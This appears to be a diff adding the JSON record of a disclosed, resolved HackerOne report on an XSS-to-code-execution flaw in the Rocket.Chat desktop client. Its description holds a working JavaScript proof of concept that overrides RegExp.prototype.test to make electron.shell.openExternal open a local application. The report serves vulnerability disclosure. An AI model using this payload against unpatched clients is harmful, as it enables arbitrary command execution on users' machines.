@@ -1,0 +1,126 @@
+{
+  "id": 899964,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTk5NjQ=",
+  "url": "https://hackerone.com/reports/899964",
+  "title": "XSS leads to RCE on the RocketChat desktop client.",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-06-16T21:43:42.695Z",
+  "submitted_at": "2020-06-16T21:43:42.695Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "fabianfreyer",
+    "url": "/fabianfreyer",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19858,
+    "url": "https://hackerone.com/rocket_chat",
+    "handle": "rocket_chat",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Rocket.Chat",
+      "twitter_handle": "RocketChat",
+      "website": "https://rocket.chat",
+      "about": "Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-01-01T14:15:11.203Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-12-02T14:15:03.485Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** It is possible to call `electron.shell.openExternal` from javascript inside a server webview.\n\n**Description:** The document `onclick` handler allows executing `electron.shell.openExternal` by crafting an attacker-controlled link and dispatching a `click` event on it after overwriting `Regex.test`.\n\n## Releases Affected:\n\n  * Rocket.Chat Desktop Client up to version 2.17.9\n\n## Steps To Reproduce (from initial installation to vulnerability):\n\n  1. Have a XSS vulnerability such as #894462 or #899954.\n  2. Call the following payload (for macos, adjust for other OSes as required):\n\n```js\n(function() {\n    const payload = `file:///System/Applications/Calculator.app`;\n    var counter = 0;\n    var target = document.createElement(`a`);\n    target.setAttribute(`href`, payload);\n    document.body.appendChild(target);\n    var old_test = RegExp.prototype.test;\n    RegExp.prototype.test = function (s) {\n        if (s === payload) {\n            return (++counter > 3);\n        }\n        return old_test.call(this, s);\n    };\n    target.dispatchEvent(new Event(`click`));\n})();\n```\n\n  3. Browse to a page with the XSS payload.\n  4. Use your freshly opened calculator to calculate the result of 7*191.\n\n## Impact\n\nAn attacker with a XSS vulnerability in RocketChat such as #894462 or #899954 can call `electron.shell.openExternal` with arbitrary URLs, leading to arbitrary command execution.",
+  "weakness": {
+    "id": 59,
+    "name": "OS Command Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 870955,
+      "file_name": "rc.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/WZN7AH2Km3P9ZoPsyNmQ3SoM?response-content-disposition=attachment%3B%20filename%3D%22rc.png%22%3B%20filename%2A%3DUTF-8%27%27rc.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRPZENPKD%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T074931Z&X-Amz-Expires=1042&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIAVHQbwsDoPkABWT5%2B%2FcxKj9dlPUCiAK7T%2BFFCXdxLrPAiBX2lSHjESlSy8QsUlA7vXdLSn4ea4Xiiw2UrbmZz%2Blwyq7BQj7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMDCypXEsZEkr5ireXKo8FZYoY4LAjDpPPUtd1NsbqDrfHEKbol%2Fl0zbzUkHb%2FDMyufObmydLXAVfTWyTq8M83futwK1Yua1CHEl3flNsyoGlBRT7783Yno%2BSIhflCnhdl34SfYe3WSz3KMlR6U6rObGpEEedLsrp2lH30QPw%2BCCr0rMC2GFUhTSW8t1aSZgiThB4a7g4EkofATsLrkgjKf%2F%2FPbVuhiONHZD7V8A4dsRicBCm5QCAJ8gdc9%2Fa%2FchZNAQalNGvbYjZZ4OZClucbktKQgwOkNtsAZ%2F3fpin4oioVvhBVK2QTGYKzS9Vw4AgUKbRO2C4PTfySYDWuyUTG9zrGCEYEq6MtYjVjMciE9aPiEW4OCpALv9c%2Fnhwo6XyDEUc5Y4J7kpkmgxiJm%2FnKnhBX6L%2FhwQimgfYkpHdiPVQDdH6CJRToS884u7zt6Oitvu9ZxHRv%2BNw7UWz8C%2F4zpUT%2F1YrDnDMW8LmGWj5lTMuNW%2F%2FXeN9PV64LEdK1XnN26vJLY9tPRAkAEphIEa2Mp9mhZZ1Z7MefD7V4WTQZUazBcZfZdFjfOMrh0ibOMgoo8CCiL1Cm7uQQ1CzZt%2BtZzM6OlBy%2BgYE8qtUpXtotvnXnqU2Unr329EMF1ngMiPpfnJK2zIC6KlnKvp5D1PoUUJ5BP1ka873JsX69XDa2ARmnfKK2hUOe6FyV4OPe7zIMQgyJiAbEHWzMS3mq4pEiKJvvdg3xhF6AkjB92yRN1CNtLBnr1601Z%2F11uh3k97BGpzb5otiRC9tOjelGgcp81%2B5cUuuo5muMij9PbHD2r02l0F7WTXYCw6PyFC15Om5QvWq74M%2BgyuElq61LfIE5IkUt44aIWcdWTvBBa%2FpxFjyIiYpZJqIus6ylSdxepDCFur3GBjqyAazMVovu%2FR7HlzcY6BZH9cet9jDRlt4O%2Fc7u%2BrXfJy0AyilF%2B4S%2B1%2FNq3RFpJPt7gS%2FWDMzJBRmOs0q8SVlHxvhV3uzMsWZYHd5YH9PmXpJ7RM%2FT71zoNIxnESl69wmjk00scT45yz6xd%2FW6SzJWdAn5FKDKPGkQzhsO%2Bg5iALG%2F6Ghlp9VB%2Fw5RX5GDfsXlaq2IFEEcViasX2xZl9TGDZ8G2xXZXFJXAZ8px7d1T5xkzbU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=324e911c1f22e36b708701dee26742fc82f448cb3e9cb6ff53dd48263b66b434",
+      "file_size": 1439777,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-01-01T14:15:03.525Z",
+  "allow_singular_disclosure_after": -148930468.2756718,
+  "singular_disclosure_allowed": true,
+  "vote_count": 31,
+  "voters": [
+    "tokyoenigma",
+    "aboba",
+    "arist0phanes",
+    "bhuku",
+    "benjamin-mauss",
+    "parsiya",
+    "bibekshah",
+    "bl4de",
+    "nightm4re",
+    "hundredpercent",
+    "and 21 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
